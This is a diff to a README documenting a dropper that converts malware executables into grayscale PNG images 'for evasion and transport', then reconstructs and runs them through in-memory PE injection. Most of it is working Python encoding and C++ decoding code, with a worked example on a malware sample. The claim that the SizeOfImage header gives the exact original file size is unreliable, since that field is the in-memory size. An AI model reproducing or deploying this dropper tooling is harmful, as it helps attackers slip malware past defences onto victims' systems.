@@ -1,9 +1,115 @@
-# PNG-Embedded Dropper: Complete Technical Documentation
+# PNG-Embedded Dropper System
 
 ## Overview
-A production-ready dropper system that converts malware executables into PNG image format, embeds them as DLL resources, then reconstructs and executes them at runtime via advanced in-memory PE injection.
+A production-ready dropper system that converts malware executables into PNG image format for evasion and transport. The system performs lossless PE-to-PNG conversion using direct byte mapping, then reconstructs and executes the original malware at runtime via advanced in-memory PE injection.
 
-**Note**: This is **NOT true steganography**. We are not hiding data within existing images. Instead, we convert raw PE bytes directly into PNG pixel data, then embed the entire PNG file as a binary resource in the dropper DLL.
+**Important**: This is **NOT steganography**. We convert raw PE bytes directly into PNG pixel values, creating new PNG files rather than hiding data within existing images.
+
+
+🔍 Detailed Conversion Analysis
+Step 1: PE Reading
+```
+# Example: Malware sample is 180,736 bytes
+pe_data = f.read()  # 180,736 bytes of actual malware code
+```
+Step 2: Dimension Calculation
+```
+pe_size = 180,736 bytes
+width = ceil(sqrt(180,736)) = ceil(425.13) = 426
+height = ceil(180,736 / 426) = ceil(424.26) = 425
+total_pixels = 426 × 425 = 181,050 pixels needed
+```
+Step 3: Padding Calculation & Application
+What gets padded?
+```
+padding_needed = 181,050 - 180,736 = 314 bytes
+pe_data_padded = pe_data + b'\x00' * 314
+# Result: 180,736 bytes malware + 314 zero bytes = 181,050 bytes total
+```
+
+314 null bytes (\x00) added AFTER the malware
+No modification of the original 180,736 malware bytes
+Padding is pure zeros appended to the end
+
+
+## PE ↔ PNG Conversion Process
+
+### Encoding (PE → PNG)
+**Library Used**: Python PIL (Pillow) + NumPy for image creation
+**Method**: Direct byte-to-pixel mapping
+
+```python
+# pe_to_image.py conversion process
+def pe_to_png(pe_path, output_path):
+    # 1. Read raw PE bytes
+    pe_data = open(pe_path, 'rb').read()
+    pe_size = len(pe_data)
+    
+    # 2. Calculate near-square dimensions to minimize file size
+    width = math.ceil(math.sqrt(pe_size))
+    height = math.ceil(pe_size / width)
+    
+    # 3. Pad PE data to fit exact image dimensions
+    total_pixels = width * height
+    padding_needed = total_pixels - pe_size
+    padded_data = pe_data + b'\x00' * padding_needed
+    
+    # 4. Convert bytes to grayscale image array
+    image_array = np.frombuffer(padded_data, dtype=np.uint8).reshape(height, width)
+    
+    # 5. Create PNG: Each PE byte becomes one pixel (0-255 grayscale)
+    image = Image.fromarray(image_array, mode='L')  # 8-bit grayscale
+    image.save(output_path, 'PNG')
+```
+
+**Key Formula**: `width = ceil(sqrt(pe_size))` creates near-square images for optimal compression.
+
+### Decoding (PNG → PE)
+**Library Used**: LodePNG (C library) for high-performance decoding
+**Method**: Pixel-to-byte extraction with PE validation
+
+```cpp
+// Source.cpp png_to_pe() function
+void* png_to_pe(unsigned char* png_data, size_t png_size, DWORD* pe_size) {
+    unsigned char* image_data;
+    unsigned width, height;
+    
+    // 1. Decode PNG using LodePNG library (LCT_GREY, 8-bit)
+    unsigned error = lodepng_decode_memory(&image_data, &width, &height, 
+                                         png_data, png_size, LCT_GREY, 8);
+    
+    // 2. Calculate total pixel count = total PE bytes
+    size_t total_image_size = width * height;
+    
+    // 3. Copy pixel values back to PE buffer (1 pixel = 1 byte)
+    void* pe_data = malloc(total_image_size);
+    memcpy(pe_data, image_data, total_image_size);
+    free(image_data);
+    
+    // 4. Validate PE structure and determine actual size
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
+    if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {  // "MZ" signature
+        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
+        if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {  // "PE" signature
+            *pe_size = nt_headers->OptionalHeader.SizeOfImage;  // Remove padding
+        }
+    }
+    
+    return pe_data;
+}
+```
+
+### Conversion Mathematics
+- **Encoding**: `PE_byte[i] → PNG_pixel[i]` (values 0-255 preserved exactly)
+- **Dimensions**: `width × height ≥ pe_size` (minimal padding for square fit)
+- **Decoding**: `PNG_pixel[i] → PE_byte[i]` (lossless reconstruction)
+- **Size Recovery**: PE headers provide exact original size vs padded image size
+
+### Why This Works
+1. **8-bit Grayscale**: PNG pixels store values 0-255, matching byte range exactly
+2. **Lossless Compression**: PNG preserves all pixel values without artifacts  
+3. **1:1 Mapping**: Each PE byte becomes exactly one pixel value
+4. **PE Validation**: DOS/NT signatures confirm successful reconstruction
 
 ## Production Files Analysis
 
